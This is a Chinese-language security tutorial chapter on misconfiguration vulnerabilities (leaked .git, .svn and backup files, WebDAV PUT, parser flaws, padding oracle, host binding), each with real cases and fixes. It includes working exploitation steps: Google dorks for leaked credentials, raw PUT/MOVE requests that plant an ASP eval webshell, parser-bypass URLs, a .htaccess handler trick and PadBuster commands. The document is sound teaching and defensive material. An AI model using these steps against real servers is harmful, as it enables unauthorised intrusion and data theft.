#配置产生的漏洞

##Github导致文件泄露

**1、Github简介**

---
GitHub是一个共享虚拟主机服务，用于存放使用Git版本控制的软件代码和内容项目。它由GitHub公司（曾称Logical Awesome）的开发者Chris Wanstrath、PJ Hyett和Tom Preston-Werner使用Ruby on Rails编写而成。

作为开源代码库以及版本控制系统，Github目前已拥有超过350万的开发者用户。随着越来越多的应用程序转移到了云上，Github已经成为了管理软件开发以及发现已有代码的首选方法。

**2、漏洞成因及危害**

---
Github是目前全球最热门的在线协作网站，大量的程序员都会在Github上分享自己的代码以及协力进行软件开发。 但与此同时，部分的程序员出于各种原因而没有删除所分享代码中的重要敏感信息，而被黑客利用与攻击系统。

在Github中被泄露的敏感信息主要包括以下几类

	邮箱信息
	SVN信息
	内部账号及密码
	数据库连接信息
	服务器配置信息
	这些敏感信息有的只是导致一些无法被外网连接的内网账户信息或者数据库连接信息泄露，但时也可能会导致公司重要的商业秘密或程序源代码被他人窃取，管理员账户被控制或者数据库泄露等，造成巨大的损失。

**3、漏洞检测及利用**

---
使用搜索引擎搜索语法便可快速从Github上找到需要的信息，以下是几个示例。

Google hack:
	
	site:Github.com smtp 
	site:Github.com sa password
	site:Github.com root password
	site:Github.com User ID='sa';Password
	site:Github.com svn
	site:Github.com ftp
也可使用Github敏感信息收集工具GitHack。

**4、实际案例**

---
[北京大学内部邮件账号泄漏](http://www.wooyun.org/bugs/wooyun-2010-0100238)

[阿里巴巴某系统弱口令](http://www.wooyun.org/bugs/wooyun-2010-0108535)

[泄露youku各种信息内含数据库论队友的重要性](http://www.wooyun.org/bugs/wooyun-2010-095466)

[高德软件多个信息泄露，影响公司安全](http://www.wooyun.org/bugs/wooyun-2010-094921)

[UC某业务导致敏感内部邮件信息泄露](http://www.wooyun.org/bugs/wooyun-2010-091525)

**5、漏洞修复**

---
将源码上传至Github公开仓库前注意对敏感信息打码或者删除。

**6、相关资源**

---
[Gitrob: Putting the Open Source in OSINT](http://michenriksen.com/blog/gitrob-putting-the-open-source-in-osint/)

##Git导致文件泄露

**1、Git简介**

---
Git是一款免费、开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。

**2、漏洞成因**

---
在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。

**3、漏洞检测及利用**

---
***3.1、手工搜索法***
google搜索

	".git"  intitle:"index of" 
下载.git文件

	wget --mirror --include-directories=/.git http://www.target.com/.git
	cd www.target.com 
代码重构

git reset --hard
***3.2、工具恢复***
下载地址:

[https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)

使用方法：

	Example: ./rip-git.pl -v -u http://www.example.com/.git/ 
	Example: ./rip-git.pl # with url and options in /root/.rip-git 
或者：[https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)

**4、实际案例**

---
[中石油某站源码重构到GetShell](http://www.wooyun.org/bugs/wooyun-2010-089350)

[腾讯某二级域名站点源码等敏感文件泄露](http://www.wooyun.org/bugs/wooyun-2010-087337)

[陌陌某重要应用源码泄露](http://www.wooyun.org/bugs/wooyun-2010-086227)

[友盟网git服务使用不当导致源代码泄露](http://www.wooyun.org/bugs/wooyun-2014-076372)

**5、修复漏洞**

---
删除.git文件

**6、相关资源**

---
[通过.git获取源码](http://zone.wooyun.org/content/18004)

[http://www.slideshare.net/kost/ripping-web-accessible-git-files](http://www.slideshare.net/kost/ripping-web-accessible-git-files)

##SVN安全配置

**1、SVN简介**

---
Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。

Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。

**2、SVN服务器架设**

---
安装SVN

	#yum install subversion
测试是否安装成功

	#svnserve --version
如果显示了版本信息则表示安装成功

创建仓库

	#svnadmin create /home/svn/repo
给svn设置密码

修改配置文件/home/svn/repo/conf/svnserve.conf 去掉

	#[general]
前面的#号

匿名访问的权限，可以是read,write,none,默认为read

	anon-access = none
认证用户的权限，可以是read,write,none,默认为write

	auth-access = write
密码数据库的路径

	#password-db = passwd
去掉前面的#

修改配置文件passwd

	#vim /home/svn/repo/conf/passwd
=前面是用户名，后面是密码：

	[users]
	name = password
启动SVN服务器

对于单个代码仓库

	#svnserve -d -r /home/svn --listen-host 192.168.1.100
svn默认端口是3690，在防火墙上开放这个端口。

	/sbin/iptables -A INPUT -i eth0 -p tcp --dport 3690 -j ACCEPT
	/sbin/service iptables save
把/var/www/html/目录导入到svn的repo目录下

	svn import /var/www/html/  file:///home/svn/repo  -m "test"
	
**3、错误配置及利用**

---
SVN导致的漏洞主要有两类：

SVN未设置密码并允许匿名访问。
发布代码时使用了SVN co并且未限制对服务器上的.svn文件夹的访问。
SVN未设置密码并允许匿名访问将导致重要的源代码、数据库连接信息和服务器配置信息等敏感信息泄露，进而可能将导致服务器沦陷。

发布代码时使用了SVN co时服务器将导出一个带.svn文件夹的目录树，.svn文件夹中有包含了用于版本信息追踪的“entries”文件。如此时未限制对服务器上的.svn文件夹的访问便可被用于摸清站点结构。

更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。

如果解析了该后缀，可能会有文件解析的漏洞，可能会有扩展解析漏洞，找地方上传xxx.php.gif也许就可以直接得到webshell了。

附上个遍历.svn/entries展现网站目录结构的两个脚本： svn遍历脚本

**4、实际案例**

---
[【盛大180天渗透纪实】第四章.SVN猎手 （某站SVN信息泄露+设计问题导致服务器沦陷）](http://www.wooyun.org/bugs/wooyun-2013-020861)

[爱拍svn泄露，有被脱裤危险，想起了csdn....](http://www.wooyun.org/bugs/wooyun-2013-018998)

[优酷某分站SVN信息及某sql文件泄漏](http://www.wooyun.org/bugs/wooyun-2013-026351)

[淘宝网某应用svn信息导致代码泄露](http://www.wooyun.org/bugs/wooyun-2012-012665)

**5、修复方案**

---
设置SVN密码，并将匿名访问用户的权限设置为none。

发布代码时使用svn export导出，而不要使用svn co检索，防止泄露目录结构。

svn export使用示例

	svn  export  [-r 版本号]  http://路径 [本地目录全路径]　--username　用户名
	svn  export  [-r 版本号]  svn://路径 [本地目录全路径]　--username　用户名
	svn  export  本地检出的(即带有.svn文件夹的)目录全路径  要导出的本地目录全路径
如果已经线上的生产环境已经有了.svn目录不想删掉可以在服务器上设置禁制访问此目录：

Apache，设置.htacess:

	<Directory ~ "\.svn">
	Order allow,deny
	Deny from all
	</Directory>
Nginx,设置配置文件:

	location ~ ^(.*)\/\.svn\/ {
	return 404;
	}

**6、相关资源**

---
[Subversion官方网站](http://subversion.tigris.org/)

[用Apache和Subversion搭建安全的版本控制环境](http://www.ibm.com/developerworks/cn/java/j-lo-apache-subversion/)

[centos svn安装及配置与使用](http://blog.csdn.net/kangquan2008/article/details/8070391)

[linux下svn常用指令](http://www.cnblogs.com/aLittleBitCool/archive/2011/07/09/2101602.html)

[WooYun: .svn目录未设权限限制的漏洞利用总结](http://www.wooyun.org/bugs/wooyun-2012-05539)


##DS_store导致文件泄露

**1、DS_store简介**

---
DS_Store 是MAC中用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。

**2、漏洞成因**

---
在发布代码时未删除文件夹中影藏的.DS_store，被发现后，获取了敏感的文件名等信息。

**3、漏洞检测及利用工具**

---
路径扫描，是否存在.DS_store文件。下载后查看该文件，看是否存在敏感信息。

**4、实际案例**

---
[Camera360多各分站服务器配置不当导致未授权访问（DS_Store泄密）](http://www.wooyun.org/bugs/wooyun-2010-095996)

[TCL某网站DS_Store文件泄露敏感信息（谨慎使用Mac系统）](http://www.wooyun.org/bugs/wooyun-2010-091869)

**5、修复漏洞**

---
***5.1、直接再mac系统中禁止.DS_store生成***
打开 “终端” ，复制黏贴下面的命令，回车执行，重启Mac即可生效。

	defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool TRUE
恢复.DS_store生成：

	defaults delete com.apple.desktopservices DSDontWriteNetworkStores

***5.2、发布代码时删除所有的.DS_store文件***
递归删除指定路径中的所有.DS_Store文件

	find . -name .DS_Store -exec rm -rf {} \;

**6、相关资源**

---
[.DS_Store 文件是什么](http://www.zhihu.com/question/20345704)

[Apple Macintosh OS X .DS_Store Directory Listing Disclosure Vulnerability](http://www.securityfocus.com/bid/3324/discuss)

##网站备份压缩文件

**1、相关背景**

---
在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。

**2、漏洞成因及危害**

---
该漏洞的成因主要有以下两种：

服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。
编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。
该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。

**3、漏洞检测**

---
该漏洞的检测方法较为简单，只需要不断尝试访问服务器上的备份文件即可。提升成功率的关键在于所使用好的字典。

常见的备份文件文件后缀有以下几类：

	.rar
	.zip
	.7z
	.tar.gz
	.bak
	.swp
	.txt
	.html
	……
常见的备份文件文件名有以下几种

	www
	back
	backup
	web
	temp
	data
	新建文件夹
	……
一般需要将网站的页面文件路径，网站文件夹路径，还有常见的备份文件文件名还有文件后缀组合起来生成字典，用于备份文件扫描。

该漏洞本质上是在对网站中的备份文件路径进行爆破。有时候即使网站web目录中有备份文件存在也不一定能被猜到地址。

**4、实际案例**

---
[某市机场sql注入及备份文件文件下载](http://www.wooyun.org/bugs/wooyun-2010-098569)

[某银行整站备份文件被下载](http://www.wooyun.org/bugs/wooyun-2010-095135)

[南京信息工程大学管理员奇葩备份导致源码泄漏](http://www.wooyun.org/bugs/wooyun-2010-0105929)

**5、漏洞修复**

---
删除相应的压缩备份文件或将压缩备份文件移出web目录已防止其被下载。

**6、相关资源**

---
[动态多线程敏感信息泄露检测工具--weakfilescan](http://zone.wooyun.org/content/19523)


##WEB-INF/web.xml泄露

**1、web.xml简介**

---
WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。

WEB-INF主要包含一下文件或目录：

	/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
	/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
	/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
	/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
	/WEB-INF/database.properties：数据库配置文件

**2、漏洞成因**

---
通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。

**3、漏洞检测以及利用方法**

---
通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。

**4、实际案例**

---
[欧朋浏览器多站配置不当泄漏敏感信息](http://www.wooyun.org/bugs/wooyun-2010-094544)

[去哪儿任意文件读取（基本可重构该系统原工程）](http://www.wooyun.org/bugs/wooyun-2012-07329)

[tcl某站一种类型配置不当可getshell入内网](http://www.wooyun.org/bugs/wooyun-2010-091995)

[从一个小缺陷看某金融支付机构存在的安全隐患](http://www.wooyun.org/bugs/wooyun-2010-061490)

[百度某应用beidou（北斗）架构遍历](http://www.wooyun.org/bugs/wooyun-2012-011730)

**5、修复漏洞**

---
通过Nginx配置禁止访问一些铭感目录

	location ~ ^/WEB-INF/* { deny all; }

**6、相关资源**

---
[web服务器分层架构的资源文件映射安全以及在J2EE应用中的利用与危害](http://drops.wooyun.org/papers/60)

[WEB-INF简介](http://baike.baidu.com/view/1745468.htm)

[攻击JavaWeb应用[1]-JavaEE 基础](http://drops.wooyun.org/tips/163)

##HTTP请求方法（PUT）

**1、HTTP请求方法简介**

---
HTTP/1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：

	OPTIONS：这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用'*'来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。
	HEAD：与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。
	GET：向指定的资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在Web Application中。其中一个原因是GET可能会被网络蜘蛛等随意访问。参见安全方法
	POST：向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。
	PUT：向指定资源位置上传其最新内容。
	DELETE：请求服务器删除Request-URI所标识的资源。
	TRACE：回显服务器收到的请求，主要用于测试或诊断。
	CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。
WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。

IIS实现Webdav是采用的其两种接口CGI、ISAPI的ISAPI接口。

但因为其没有采用影射的方式，所以IIS的主程序w3svc.dll本身包含了Webdav的信息。

其识别出是Webdav的请求后就调用Webdav的处理模块httpext.dll。

对于常见几种请求方法GET、HEAD、POST等，因为常见一些映射都支持。

所以不能以请求方法作为Webdav请求的判断，w3svc.dll就根据请求头的字段识别。 如果请求头里面包含Translate:、If:、Lock-Token:中的一种，就认为是Webdav的请求。

Translate:就是那个Translate:f的泄露源代码的一个请求头，其实设置别的两个也是一样的。

可能很多IDS是没有这点知识的。W3svc.dll还内置了几个别的请求方法TRACK、TRACE等。

TRACK就是用于调试错误的，如果收到这样的请求头，w3svc.dll会原样返回请求数据。

相当于我们常见的ping.exe。

IIS对TRACK请求没有进行LOG记录，这点我们可以用于来获得banner。

对于IIS将优于大家习惯使用的HEAD。

如果上面的请求方法没匹配，那么w3svc.dll就会认为是Webdav的请求，交给httpext.dll处理了。

这些请求包含Webdav支持的PROPFIND、PROPPATCH、MKCOL、DELETE、PUT、COPY、MOVE、LOCK、UNLOCK等。

**2、漏洞成因**

---
web服务器默认是不开启PUT等方法的，出现该漏洞的原因主要是网站管理员对服务器的错误配置。常见的主要就是管理员错误地打开了IIS的服务器的webDAV而且没有开启权限验证，导致可以PUT文件到服务器再利用服务器的解析漏洞运行恶意代码或者用webDAV的MOVE方法将所上传的带有恶意代码的普通文件后缀修改为可执行文件后缀，运行恶意代码。

若服务器开始了DELETE方法，是可以利用其删除网站上文件的，但是实际案例极少，而且开启了DELETE方法的服务器一般也会开始PUT方法，与PUT方法的危害相比，DELETE方法的危害显然要小得多。

**3、漏洞的检测及利用**

---
对服务器发送OPTION包：

	OPTIONS / HTTP/1.1
	Host: www.xxx.com
若返回的HTTP响应头中带有PUT、MOVE等方法时则可以确定服务器开启了WebDAV。

此时用PUT上传一个SHELL，但SHELL后缀不可以是可执行文件后缀。

	PUT /test.txt HTTP/1.1
	Host: www.xxx.com
	Content-Length: 23

	<%eval request("a")%>
若服务器启用了“WebDAV”扩展，并且复选了“写入”，就可以写入txt文件了。

若服务器开启了“脚本资源访问”，可以用MOVE方法将txt后缀文件改成可执行文件的后缀。

	MOVE /test.txt HTTP/1.1
	Host: www.xxx.com
	Destination: http://www.xxx.com/shell.asp
若服务器关闭了“脚本资源访问”，可利用IIS解析漏洞来执行shell。

	MOVE /test.txt HTTP/1.1
	Host: www.xxx.com
	Destination: http://www.xxx.com/test.asp;.jpg
若服务器开启了DELETE方法，可以使用以下HTTP请求删除制定文件。

	DELETE /test.txt HTTP/1.1
	Host: www.xxx.com
你也可以使用以下的开源DAV管理工具：

[DAV Explorer](http://www.davexplorer.org/installation.html)_

**4、实际案例**

---
[15个gov edu的IISPUT漏洞合集](http://www.wooyun.org/bugs/wooyun-2010-032273)

[海康威视某通用系统配置不当可PUT文件](http://www.wooyun.org/bugs/wooyun-2015-0101152)

[某市红十字会由于iis配置不当导致put任意文件上传](http://www.wooyun.org/bugs/wooyun-2015-097612)

**5、漏洞修复**

---
禁用WebDAV

通常情况下网站不需要支持额外的方法，右键WebDAV，点击禁用即可。

如果要使用WebDAV的话，加上权限验证

如果选取“脚本资源访问”，则用户将具备修改WebADV文件夹内的脚本文说明件(scriptfile)的功能。

除了此处的虚拟目录权限外，还需要视NTFS权限，才可以决定用户是否有权限来访问WebDAV文件夹内的文件。

WebDAV文件夹的NTFS权限给予用户适当的NTFS权限。

首先请设置让Everyone组只有“读取”的权限，然后再针对个别用户给予“写入”的权限，例如我们给予用户“User”写入的权限。

选择验证用户身份的方法启动“IIS管理器”，然后右击WebDAV虚拟目录，选择“属性”→“目录安全性”，单击“身份验证和访问控制”处的编辑按钮。

不要选取“启用匿名访问”，以免招致攻击。选择安全的验证方法，选择“集成Windows身份验证”。

**6、相关资源**

--
[超文本传输协议](http://zh.wikipedia.org/wiki/超文本传输协议)

[WebDAV](http://zh.wikipedia.org/wiki/WebDAV)

[IIS WebDAV安全配置](http://drops.wooyun.org/papers/238)

[IIS的Webdav简单介绍](http://hi.baidu.com/yuange1975/item/a836d31096b5b959f1090e89)

[远程分析IIS设置](http://www.daxigua.com/archives/1597)

[小议IIS的特殊权限](http://www.daxigua.com/archives/2750)

[IIS可以PUT，但无法MOVE的原因](http://www.daxigua.com/archives/2747)


##解析漏洞

**1、漏洞简介**

---
解析漏洞是指web服务器因对http请求处理不当导致将非可执行的脚本，文件等当做可执行的脚本，文件等执行。该漏洞一般配合服务器的文件上传功能使用，以获取服务器的权限。

**2、漏洞成因、检测及利用**

---
使用了低版本的，存在漏洞的web服务器。解析漏洞有以下几种：
	
***IIS 5.x/6.0解析漏洞***

目录解析:在网站下建立文件夹的名称中带有.asp、.asa等可执行脚本文件后缀为后缀的文件夹，其目录内的任何扩展名的文件都被IIS当作可执行文件来解析并执行。
	
	http://www.xxx.com/xx.asp/xx.jpg
文件解析:在IIS6.0下，分号后面的不被解析，也就是说6.0下，分号后面的不被解析，也就是说xx.asp;.jpg将被当做xx.asp解析并执行。

	http://www.xxx.com/xx.asp;.jpg
IIS6.0 默认的可执行文件有asp、asa、cer、cdx四种。

***IIS 7.0/IIS 7.5/ Nginx <0.8.3畸形解析漏洞***

在默认Fast-CGI开启状况下，访问以下网址，服务器将把xx.jpg文件当做php解析并执行。

	http://www.xxx.com/xx.jpg/.php
***Nginx <8.03 空字节代码执行漏洞***

影响范围：Nginx0.5.,0.6., 0.7 ⇐ 0.7.65, 0.8 ⇐ 0.8.37

访问以下网址，服务器将把xx.jpg文件当做php解析并执行。

	http://www.xxx.com/xx.jpg%00.php
***Apache解析漏洞***

Apache对文件解析是从右到左开始判断解析,如果文件的后缀为不可识别,就再往左判断，解析。 如xx.php.owf.rar，由于Apache无法解析rar和owf后缀，但能够解析php后缀，因此Apache会将xx.php.owf.rar当做php格式的文件进行解析并执行。

访问以下网址，服务器将把xx.php.owf.rar文件当做php解析并执行。

	http://www.xxx.com/xx.php.owf.rar
***CVE-2013-4547 Nginx解析漏洞***

访问以下网址，服务器将把xx.jpg文件当做php解析并执行。

	http://www.xxx.com/xx.jpg（非编码空格）\0.php
***使用.htaccess将任意文件作为可执行脚本解析***

如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:

	<FilesMatch ".(jpg)$"> SetHandler application/x-httpd-php </FilesMatch>
这将把目录下的所有后缀为jpg的文件当做可执行的php脚本进行解析并执行。

**3、实际案例**

---
***IIS 5.x/6.0解析漏洞***

[中国电信山东分公司某平台getshell可渗透内网](http://www.wooyun.org/bugs/wooyun-2010-092071)

[武汉大学某站fck上传与IIS6解析漏洞](http://www.wooyun.org/bugs/wooyun-2010-094428)

***IIS 7.0/IIS 7.5/ Nginx <8.03畸形解析漏洞***

[用友软件某分站SQL注入漏洞+nginx解析漏洞](http://www.wooyun.org/bugs/wooyun-2013-032250)

[新浪网分站多处安全漏洞（nginx解析+SQL注射等）小礼包](http://www.wooyun.org/bugs/wooyun-2013-021064)

[kingsoft.com某x级域名nginx解析漏洞+爆路径](http://www.wooyun.org/bugs/wooyun-2013-019253)

***Nginx <8.03 空字节代码执行漏洞***

[56网某分站补丁不及时已webshell（20多万会员数据）](http://wooyun.org/bugs/wooyun-2010-033033)

[金山毒霸后台及nginx截断打包](http://wooyun.org/bugs/wooyun-2010-09578)

[phpdisk网盘上传解析漏洞](http://wooyun.org/bugs/wooyun-2010-03541)

***Apache解析漏洞***

[uc某站getshell可入内网](http://www.wooyun.org/bugs/wooyun-2010-095579)

[安卓开发平台存在上传漏洞和Apache解析漏洞,成功获取webshell](http://www.wooyun.org/bugs/wooyun-2010-018433)

***CVE-2013-4547 Nginx解析漏洞***

***使用.htaccess将任意文件作为可执行脚本解析***

**4、漏洞修复**

---
升级web服务器版本或安装相应的官方补丁。

**5、相关资源**

---
[CVE-2013-4547 Nginx解析漏洞深入利用及分析](http://drops.wooyun.org/tips/2006)


##目录遍历

**1、漏洞简介**


---
当web服务器目录浏览的功能被开启时，若客户端浏览器在请求未指定文档名称且web服务器无法返回默认文档时便会启用目录浏览，显示一个列出目录内容的网页，或者当网站的代码存在缺陷，导致可以获取到服务器目录内容、结构，进而影响网站的敏感信息，威胁系统安全。

**2、漏洞成因及利用**

---
该漏洞的成因主要包括两类：

	web服务器的配置引起的目录遍历
	网站代码缺陷引起的目录遍历
	IIS和Nginx默认不开启目录遍历的功能，而Apached默认开启了目录遍历的功能。

当web服务器目录遍历的功能被开启时，若客户端浏览器在请求未指定文档名称且web服务器无法返回默认文档时，便会启用目录浏览，显示一个列出目录内容的网页。

网站代码的缺陷也会引起目录遍历，常见的是一些开源的编辑器的页面未授权访问，以及一些限制被绕过。参见：[PHP绕过open_basedir列目录的研究](http://drops.wooyun.org/tips/3978)。

因各种原因导致的目录遍历，将对系统安全形成巨大的威胁。其将造成网站上非可执行文件的泄露，进而可能导致网站的数据库连接信息等泄露。

**3、实际案例**

---
[乌云某处存在可以列目录以及绝对路径泄漏漏洞（第三方应用）](http://www.wooyun.org/bugs/wooyun-2010-067409)

[大庆某教育类网站已被提权](http://www.wooyun.org/bugs/wooyun-2010-0103565)

[TCL某重要站点从目录遍历到成功提权](http://www.wooyun.org/bugs/wooyun-2010-0100286)

**4、漏洞修复**

---
***网站代码缺陷引起的目录遍历***

对网站代码进行更新，升级。

***web服务器配置引起的目录遍历***

Apached禁止目录浏览:

配置httpd.conf

将Options Indexes FollowSymLinks改为Options -Indexes FollowSymLinks

Nginx禁止目录浏览:

配置nginx.conf，找到WebServer配置处,删除类似内容:

	location /soft/ {
	root /var/www/;  此处为soft的上一级目录
	autoindex on;
	autoindex_exact_size off;
	autoindex_localtime on;
	}
保存退出,重启nginx服务即可。

	[root@localhost Soft]#ps aux | grep -v grep | grep nginx | awk ‘{print $2}’ | xargs kill -9    #结束进程
	[root@localhost Soft]#nginx  #启动进程
***IIS禁止列目录***

	appcmd set config /section:directoryBrowse /enabled:false

**5、相关资源**

---
[Apache安全配置](http://drops.wooyun.org/运维安全/2727)

[在 IIS 7 中启用或禁用目录浏览](https://technet.microsoft.com/zh-cn/library/cc731109)

[PHP绕过open_basedir列目录的研究](http://drops.wooyun.org/tips/3978)


##Padding Oracle

**1、漏洞简介**

---
padding oracle又名MS10-070，是ASP.NET中由于加密填充验证过程中处理错误不当，导致存在一个信息泄漏漏洞。成功利用此漏洞的攻击者可以读取服务器加密的数据，例如视图状态。 此漏洞还可以用于数据篡改，如果成功利用，可用于解密和篡改服务器加密的数据。 虽然攻击者无法利用此漏洞来执行恶意攻击代码或直接提升他们的用户权限，但此漏洞可用于信息搜集，这些信息可用于进一步攻击受影响的系统。

**2、漏洞成因**

---
在对称加密算法中，密文就是密钥加明文经过加密算法处理的结果。加密算法里面的加密是分块实施的，如DES,RC2等算法。每块固定n(8,16,32)位，有余数的情况一般按照某种规则补足，就是所谓的Padding填充，如常用的PKCS#5规则，就是根据最后一个数据块所缺少的长度来选择填充的内容。为了加强加密的效果，所以会把上一块的密文用 来混淆下一块加密数据，以此类推，用来混淆第一块数据的是预先生成的IV（初始化向量）。

对于加密算法来说，它们是基于等长的“数据块”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节，而对于Rijndael算法来说则是16、24或32字节）。但是我们的输入数据长度是不规则的，因此必然需要进行“填充”才能形成完整的块，通过这种规则我们便可以根据填充的内容来得知填充的长度，以便在解密后去除填充的字节。

一个密文被解密时也是分段进行的，在解密完成之后算法会先检查是否符合规则，如果它的Padding填充方式不符合规则，那么表示输入数据有问题。对于解密的类库来说，往往便会抛出一个PaddingError异常，提示Padding不正确。

在PaddingOracle攻击中，黑客只需要一个合法密文，即可通过不断向网站发送篡改过的密文（这个过程主要是构造IV的过程），观察是否有Padding异常错误提示，网站中的异常错误提示可能直接显示在网页当中，也可能只是HTTP状态码，根据两个不同的HTTP状态码做对比即可，而不需要其他任何详细信息。如果有异常错误提示即可不断地给网站程序提供密文，让解密程序给出错误提示，再而不断地修正，从而最终获得混淆之前的中间密文。拿到中间密文之后，可以通过构造IV，使得中间密文被逆向混淆之后得到的明文为指定内容，从而达到攻击的目的。在这过程中PaddingOracle攻击并没有破解掉加密算法的密钥，也没有能力对任意密文做逆向解密，只是可以利用一个有效密文，生成一个解密后得到任意指定内容明文的伪造密文。

**3、漏洞检测及利用**

---
漏洞检测利用工具[padBuster.pl](https://github.com/GDSSecurity/PadBuster)与Webconfig Bruter.pl。
使用方法
	Padbuster.pl http://www.xxx.com/WebResource.axd?d=XXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXX 16 -encoding 3 -plaintext "|||~/web.config"
XXXXXXXXXXXXXXXX是http://www.xxx.com/WebResource.axd?d=XXXXXXXXXXXXXXXX中参数d的值。 16为每个数据块的字节数，分为8和16。encoding参数有4种，分别是0=Base64, 1=Lower HEX, 2=Upper HEX 3=.NET UrlToken, 4=WebSafe Base64。plaintext为想读取内容的文件，本次这里以web.config为例。之后按程序提示进行操作。若网站存在padding oracle漏洞，最终将返回web.config的URL的加密地址。

	Webconfig Bruter.pl http://www.xxx.com/ScriptResource.axd XXXXXXXXXXXXXXXXXX 16
XXXXXXXXXXXXXXXXXX为Padbuster.pl得到的加密地址。

访问

	http://www.xxx91ri.org/ScriptResource.axd?d=XXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXX为Webconfig Bruter.pl得到的加密地址。服务器会返回目标文件的内容（此处为web.config文件）。

**4、实际案例**

---
[迅雷某分站padding oracle漏洞](http://www.wooyun.org/bugs/wooyun-2010-052726)

[锐捷某系统padding oraacle漏洞泄露内部数据库密码与web配置信息](http://www.wooyun.org/bugs/wooyun-2010-035874)

[唯品会某处存在文件读取漏洞（padding oracle实际利用）](http://www.wooyun.org/bugs/wooyun-2010-033805)

**5、漏洞修复**

---
安装微软官方补丁。

**6、相关资源**

---
[Microsoft 安全公告 MS10-070 - 重要](https://technet.microsoft.com/library/security/ms10-070)

##关于服务器的host绑定的不安全因素

**1、host主机头**

---
host主机头绑定是很多网站常用的一种一机多站的实现方法,相对于使用不同端口来实现一机多站要安全许多,因为端口可以通过暴力手段找到,而host绑定就要难破解很多,因为需要IP和主机名的对应.

**2、漏洞成因及危害**

---
很多网站为了方便管理和节省服务器成本,将内网管理站点和外网站点放置在同一服务器下,使用一机多站来进行隔离.

很多情况下一台服务器安装两块网卡,分别接入外网和内网,方便公网访问公开站点,内网访问管理站点.并绑定host.

例如:

	xxx.com为公开站点,并且指向IP为公网网卡.
	admin.xxx.com为管理站点,并且指向内网网卡.
看上去好像管理站点admin.xxx.com必须在内网才能访问但是却忽略了host绑定的问题.

但是当我们将外网IP地址强制绑定到admin.xxx.com的时候web服务器又没有做来源检查,那么我们就可以通过外网访问到本来应该只有内网才能访问的管理站点了.

并且由于是内网站点很多情况下管理员为了方便都是弱密码,或者直接未授权访问等

**3、漏洞的利用**

---
利用的话可以直接使用域名的一个暴力猜解

将外网IP和内网IP的域名全部记录下来

例如

	xxx.com          ip     1.1.1.1
	admin.xxx.com    ip     10.0.0.1
再使用工具将内网域名绑定到外网站点的IP上

写入hosts文件

	1.1.1.1 admin.xxx.com 
即可访问到内网站点了

**4、漏洞案例**

---
[途牛另类方式导致内网部分敏感系统泄露](http://www.wooyun.org/bugs/wooyun-2014-081180)

[盛大某游戏GM工具注入进入后台](http://www.wooyun.org/bugs/wooyun-2010-093577)

[傲游内网不完整漫游(大量内外网源码可被泄漏)](http://www.wooyun.org/bugs/wooyun-2010-088352)

